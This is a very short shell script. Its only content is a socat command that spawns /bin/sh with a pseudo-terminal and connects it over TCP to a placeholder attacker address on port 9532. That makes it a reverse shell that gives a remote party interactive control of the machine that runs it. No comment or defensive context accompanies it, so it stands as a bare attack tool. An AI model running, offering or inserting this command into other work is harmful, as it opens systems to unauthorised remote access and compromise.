#!/bin/sh
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:X.X.X.X:9532
